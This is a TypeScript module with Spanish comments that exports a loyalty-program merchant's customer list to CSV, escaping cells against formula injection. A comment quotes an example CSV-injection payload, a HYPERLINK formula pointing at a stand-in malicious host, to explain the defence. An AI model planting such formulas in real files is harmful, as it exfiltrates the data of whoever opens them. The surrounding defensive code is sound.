import type { SupabaseClient } from '@supabase/supabase-js';
import type { Database } from '../supabase/types';
import { listarProgramas } from './programas';
import { describirCosto } from '../tarjetas/unidadPrograma';

// Exportación de la base de clientes del comercio a CSV. "Tus datos son tuyos" es algo que la
// competencia vende explícitamente y que acá no existía.
//
// Las dos partes difíciles de un CSV no son generarlo:
//   1. Que Excel no ejecute nada. Ver escaparCelda.
//   2. Que Excel lea bien los acentos. Ver BOM_UTF8.

export interface FilaExportacion {
  nombre: string;
  telefono: string;
  // A cuál de las tarjetas del comercio pertenece la fila. Sin esta columna, en un comercio con dos
  // programas activos la fila de alguien con 8 sellos y la de alguien con $8.00 se ven identicas.
  tarjeta: string;
  // YA FORMATEADO en la unidad de ese programa: "8 sellos", "$12.50", "3 visitas". Es un string y
  // no un numero A PROPOSITO — `puntos_actuales` es un contador universal cuyo significado depende
  // del tipo, y exportar 1250 bajo una columna llamada "Saldo" no es ambiguo: es falso por un
  // factor de cien. Mezclar unidades en una columna hace que sumarla no signifique nada de todas
  // formas, asi que la claridad no cuesta aritmetica.
  saldo: string;
  visitas: number;
  alta: string;
}

// Excel y Google Sheets interpretan como FÓRMULA toda celda que empiece con =, +, - o @ (y con tab
// o retorno de carro). Un cliente llamado "=1+1" es una curiosidad; uno llamado
// `=HYPERLINK("http://malo/"&A1)` convierte el CSV que el dueño abre en su computadora en un
// exfiltrador de su propia base. Es una vulnerabilidad conocida (CSV injection) y el archivo lo
// abre alguien que confía en él, que es justo lo que la hace efectiva.
//
// La defensa estándar: anteponer un apóstrofo, que Excel trata como "esto es texto" y no muestra.
//
// Efecto secundario que resulta DESEABLE: todo teléfono canónico empieza con '+', así que todos
// caen acá. Está bien — sin el apóstrofo, Excel convertiría +50377771234 en el número 50377771234 y
// se comería el signo, mutilando la columna más importante del export. El apóstrofo lo preserva y
// no se ve. (Si algún día el CSV se consume desde un script en vez de una hoja de cálculo, ahí sí
// habría que revisarlo: el apóstrofo SÍ está en los bytes.)
const PELIGROSOS = ['=', '+', '-', '@', '\t', '\r'];

export function escaparCelda(valor: string | number | null | undefined): string {
  let texto = valor === null || valor === undefined ? '' : String(valor);

  if (texto.length > 0 && PELIGROSOS.includes(texto[0])) {
    texto = `'${texto}`;
  }

  // Comillas dobles duplicadas y el campo entre comillas: es la regla de RFC 4180. Se aplica
  // siempre, no solo cuando hay comas — un campo entrecomillado de más es válido, uno de menos
  // corre todas las columnas cuando el nombre trae una coma.
  return `"${texto.replace(/"/g, '""')}"`;
}

export function generarCsv(filas: FilaExportacion[]): string {
  const encabezado = ['Nombre', 'Teléfono', 'Tarjeta', 'Saldo', 'Visitas', 'Cliente desde'];
  const lineas = [
    encabezado.map(escaparCelda).join(','),
    ...filas.map((f) =>
      [f.nombre, f.telefono, f.tarjeta, f.saldo, f.visitas, f.alta].map(escaparCelda).join(','),
    ),
  ];
  // CRLF, no LF: es lo que dice RFC 4180 y lo que Excel en Windows espera.
  return lineas.join('\r\n');
}

// Sin el BOM, Excel en Windows abre el archivo como ANSI y "José" se ve "JosÃ©". Es el detalle que
// hace que un export se sienta roto aunque los datos estén perfectos.
export const BOM_UTF8 = '﻿';

export async function filasParaExportar(
  supabase: SupabaseClient<Database>,
  comercioId: string,
): Promise<FilaExportacion[] | null> {
  const { data: tarjetas, error } = await supabase
    .from('tarjetas')
    .select('puntos_actuales, created_at, cliente_id, programa_id, clientes(nombre, telefono)')
    .eq('comercio_id', comercioId)
    .order('created_at');

  if (error) {
    console.error('[exportar] falló la consulta de tarjetas:', error);
    return null;
  }

  // Las visitas salen de reporte_top_clientes, que ya existe y ya filtra tipo='acreditacion' (o sea
  // que una corrección no infla el número). Se pide un límite alto en vez de agregarlas acá: es una
  // sola llamada y reusa la definición de "visita" que usa el resto del panel, en vez de inventar
  // una segunda que podría divergir.
  const { data: top } = await supabase.rpc('reporte_top_clientes', {
    p_comercio_id: comercioId,
    p_limite: 100_000,
  });
  const visitasPorCliente = new Map((top ?? []).map((f) => [f.cliente_id, f.visitas]));

  // El nombre y el TIPO de cada programa: el tipo es lo que decide en que unidad se lee el saldo.
  // `soloActivos: false` porque una tarjeta emitida en un programa que despues se desactivo sigue
  // existiendo, y su duenno tiene derecho a verla en su export.
  const programas = await listarProgramas(supabase, comercioId, { soloActivos: false });
  const programaPorId = new Map((programas ?? []).map((p) => [p.id, p]));

  return (tarjetas ?? [])
    .filter((t) => t.clientes)
    .map((t) => {
      const programa = programaPorId.get(t.programa_id);
      return {
      nombre: t.clientes!.nombre,
      telefono: t.clientes!.telefono,
      tarjeta: programa?.nombre ?? '',
      saldo: describirCosto(programa?.tipoTarjeta ?? 'puntos', t.puntos_actuales),
      visitas: visitasPorCliente.get(t.cliente_id) ?? 0,
      // Solo la fecha, sin hora: es un dato de negocio, no forense. El historial por cliente ya
      // cubre el detalle con hora.
      alta: t.created_at.slice(0, 10),
      };
    });
}
